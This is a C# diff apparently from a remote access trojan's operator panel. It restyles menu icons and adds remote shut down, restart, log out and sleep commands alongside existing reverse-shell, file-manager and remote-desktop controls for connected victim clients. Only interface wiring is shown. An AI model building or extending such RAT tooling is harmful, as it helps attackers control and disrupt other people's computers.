@@ -234,7 +234,7 @@ namespace ArkerRatWpfVersion
             reversShellButton.Header = "Reverse-shell";
             reversShellButton.Icon = new System.Windows.Controls.Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("CmdImage") as BitmapImage
             };
 
@@ -242,7 +242,7 @@ namespace ArkerRatWpfVersion
             fileManager.Header = "File-Manager";
             fileManager.Icon = new System.Windows.Controls.Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("FileManagerImage") as BitmapImage
             };
 
@@ -250,7 +250,7 @@ namespace ArkerRatWpfVersion
             unInstall.Header = "Uninstall client";
             unInstall.Icon = new System.Windows.Controls.Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("RemoveImage") as BitmapImage
             };
 
@@ -258,7 +258,7 @@ namespace ArkerRatWpfVersion
             disconnect.Header = "Disconnect client";
             disconnect.Icon = new System.Windows.Controls.Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("RemoveImage") as BitmapImage
             };
 
@@ -266,8 +266,40 @@ namespace ArkerRatWpfVersion
             remoteDesktop.Header = "Remote-desktop";
             remoteDesktop.Icon = new System.Windows.Controls.Image
             {
-                Stretch = Stretch.Fill,
+                Stretch = Stretch.Uniform,
                 Source = TryFindResource("RemoteDesktopImage") as BitmapImage
+            };
+
+            MenuItem shutDown = new MenuItem();
+            shutDown.Header = "Shut down";
+            shutDown.Icon = new System.Windows.Controls.Image
+            {
+                Stretch = Stretch.Uniform,
+                Source = TryFindResource("ShutDownImage") as BitmapImage
+            };
+            
+            MenuItem restart = new MenuItem();
+            restart.Header = "Restart";
+            restart.Icon = new System.Windows.Controls.Image
+            {
+                Stretch = Stretch.Uniform,
+                Source = TryFindResource("RestartImage") as BitmapImage
+            };
+
+            MenuItem logOut = new MenuItem();
+            logOut.Header = "Log out";
+            logOut.Icon = new System.Windows.Controls.Image
+            {
+                Stretch = Stretch.Uniform,
+                Source = TryFindResource("LogOutImage") as BitmapImage
+            };
+
+            MenuItem sleep = new MenuItem();
+            sleep.Header = "Sleep";
+            sleep.Icon = new System.Windows.Controls.Image
+            {
+                Stretch = Stretch.Uniform,
+                Source = TryFindResource("SleepImage") as BitmapImage
             };
 
             clientButton.ContextMenu = new ContextMenu();
@@ -282,6 +314,10 @@ namespace ArkerRatWpfVersion
             // Disconnect
             clientButton.ContextMenu.Items.Add(unInstall);
             clientButton.ContextMenu.Items.Add(disconnect);
+            clientButton.ContextMenu.Items.Add(shutDown);
+            clientButton.ContextMenu.Items.Add(restart);
+            clientButton.ContextMenu.Items.Add(logOut);
+            clientButton.ContextMenu.Items.Add(sleep);
 
             clientButton.ContextMenu.Visibility = Visibility.Visible;
 
@@ -294,6 +330,13 @@ namespace ArkerRatWpfVersion
                     disconnect.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Disconnect);
                     remoteDesktop.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartRemoteDesktop);
                     fileManager.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].StartFileManager);
+
+                    shutDown.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].ShutDown);
+                    restart.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Restart);
+                    logOut.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].LogOut);
+                    sleep.Click += new RoutedEventHandler(ArkerRATServerMechanics.rATClients[y].Sleep);
+
+
                 }
             }
         }
